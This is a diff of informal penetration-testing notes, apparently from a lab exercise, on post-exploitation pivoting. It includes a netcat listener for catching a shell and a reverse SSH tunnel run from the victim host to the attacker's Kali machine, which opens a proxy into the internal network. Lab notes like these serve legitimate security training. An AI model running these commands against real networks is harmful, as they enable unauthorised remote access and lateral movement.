@@ -4,24 +4,29 @@ https://docs.google.com/document/d/1JrZwgBWYPLqBC2X1TcaHTomDRcLvnaJJcHp34pDkkcA/
 catch persistent shell	
 (ATK) nc -lvp 55556
 
-*upgrade shell
+*upgrade shell [2:26]
+Pivot post exploitation
 
-(ATK) after catching app 1 (MY PORT 55556)
+(ATK)(TERM 1) netstat -natp (SHOULD SEE YOUR PORT AND ESTABLISHED)
+
+(ATK)(TERM 1) netstat -natp | grep LISTEN (OUT OUTPUT SHOULD BE 9080 QUAD 0* LISTEN)
+
+after catching app 1 (MY PORT 55556) SSH
 open ssh for a listner to set up proxy
 
-(TERM 1) sudo systemctl status ssh.service > CTL + C (CHECK/CHANGE/CHECK)
+(ATK)(TERM 1) sudo systemctl status ssh.service > CTL + C (CHECK/CHANGE/CHECK)
 
-(TERM 1) sudo systemctl start ssh.service
+(ATK)(TERM 1) sudo systemctl start ssh.service
 
-(TERM 1) REPEAT LINE 11 FOR (CHECK/CHANGE/CHECK)
+(ATK)(TERM 1) REPEAT LINE 11 FOR (CHECK/CHANGE/CHECK)
 
-(TERM 1) netstat -natp  (SHOULD SEE YOUR PORT AND ESTABLISHED)
+
 
 (VIC 1) ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55555 (MAKE SURE PORT FWD RULE IS GOOD ON PFSENSE SSH PORT 22)
+this how you get your proxy open???
 
 (VIC 1) should be promted a pass
 
-(ATK) (TERM 1) netstat -natp | grep LISTEN (OUT OUTPUT SHOULD BE 9080 QUAD 0* LISTEN)
 
 (ATK)(TERM 2) LS > CD INTERNAL (SHOULD SEE IP'S PING SWEEPS AND TARGETS) > LS > CD 192.168.1.102 
 
